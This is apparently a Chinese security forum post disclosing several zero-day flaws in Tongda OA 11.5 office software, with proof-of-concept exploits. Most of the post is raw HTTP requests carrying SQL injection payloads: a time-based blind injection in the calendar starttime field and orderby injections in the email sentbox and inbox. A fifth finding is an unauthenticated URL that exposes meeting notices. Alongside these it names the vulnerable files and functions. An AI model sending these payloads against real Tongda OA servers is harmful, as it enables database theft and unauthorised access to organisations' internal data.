# 通达OA 多枚 0day漏洞分享 附POC

### 影响范围:

我测试的是通达OA11.5版本，也就是2020年04月17日发布的，其他版未测，但我想也会有吧。

### 0x001 SQL注入 POC:


```bash
POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
Referer: http://192.168.202.1/portal/home/
Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
Connection: keep-alive
Host: 192.168.43.169
Pragma: no-cache
X-Requested-With: XMLHttpRequest
Content-Length: 154
X-WVS-ID: Acunetix-Autologin/65535
Cache-Control: no-cache
Accept: */*
Origin: http://192.168.43.169
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

starttime=AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---&endtime=1598918400&view=month&condition=1
```

漏洞文件：webroot\general\appbuilder\modules\calendar\models\Calendar.php。

get_callist_data函数接收传入的begin_date变量未经过滤直接拼接在查询语句中造成注入。

![](media/202008/15980949282002.jpg)


**利用条件：**

一枚普通账号登录权限，但测试发现，某些低版本也无需登录也可注入。

### 0x002 SQL注入 POC: 

漏洞参数：orderby


```bash
GET /general/email/sentbox/get_index_data.php?asc=0&boxid=&boxname=sentbox&curnum=3&emailtype=ALLMAIL&keyword=sample%40email.tst&orderby=1&pagelimit=20&tag=&timestamp=1598069133&total= HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.43.169/
Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Host: 192.168.43.169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
Connection: close
```

![](media/202008/15980949528045.jpg)


漏洞文件：webroot\inc\utility_email.php，get_sentbox_data函数接收传入参数未过滤，直接拼接在order by后面了造成注入。

![](media/202008/15980949667765.jpg)


利用条件：

一枚普通账号登录权限，但测试发现，某些低版本也无需登录也可注入。

### 0x003 SQL注入 POC: 

漏洞参数：orderby


```bash
GET /general/email/inbox/get_index_data.php?asc=0&boxid=&boxname=inbox&curnum=0&emailtype=ALLMAIL&keyword=&orderby=3--&pagelimit=10&tag=&timestamp=1598069103&total= HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.43.169
Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Host: 192.168.43.169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
Connection: close
```

![](media/202008/15980949895173.jpg)


漏洞文件：webroot\inc\utility_email.php，get_email_data函数传入参数未过滤，直接拼接在order by后面了造成注入。

![](media/202008/15980949978311.jpg)


利用条件：

一枚普通账号登录权限，但测试发现，某些低版本也无需登录也可注入。

### 0x004 SQL注入 POC: 

漏洞参数：id

![](media/202008/15980950138695.jpg)


漏洞文件：webroot\general\appbuilder\modules\report\controllers\RepdetailController.php，actionEdit函数中存在 一个$_GET["id"];  未经过滤，拼接到SQL查询中，造成了SQL注入。

![](media/202008/15980950213698.jpg)


利用条件：

一枚普通账号登录权限，但测试发现，某些低版本也无需登录也可注入。

### 0x005 未授权访问: 

未授权访问各种会议通知信息，POC链接：


```
http://127.0.0.1/general/calendar/arrange/get_cal_list.php?starttime=1548058874&endtime=1597997506&view=agendaDay
```

![](media/202008/15980950447007.jpg)


via：tangshoupu@t00ls